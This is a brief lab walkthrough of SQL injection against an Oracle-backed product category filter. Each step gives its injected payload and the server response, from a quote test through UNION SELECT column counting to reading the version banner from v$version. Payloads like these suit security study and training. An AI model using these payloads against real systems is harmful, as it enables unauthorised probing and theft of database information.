# SQL injection, querying the database type and version on Oracle

### Goal:
`Display the database version`

### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The target is using an Oracle database
<br><br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`

category=Gifts'--

`200`
<br><br>

**<ins>Step 2: Enumerate data with UNION attack</ins>**<br><br>

Since the database is Oracle, we must use Oracle-specific syntax.<br><br>

category=' UNION SELECT NULL FROM DUAL--

`500 server error`<br><br>

category=' UNION SELECT NULL,NULL FROM DUAL--

`200`

This means that the query outputs two values
<br><br>

category=' UNION SELECT 'a','b' FROM DUAL--

`200`

This means that both values are strings. Knowing this, we can use either to output the desired data
<br><br>

**<ins>Step 2: Exploit the vulnerability</ins>**

category=' UNION SELECT banner,NULL FROM v$version--

`Success!`

In a normal request, the database would output a product's name and description. This query prompts it to return the database version instead of a name, giving us valuable information for further probing.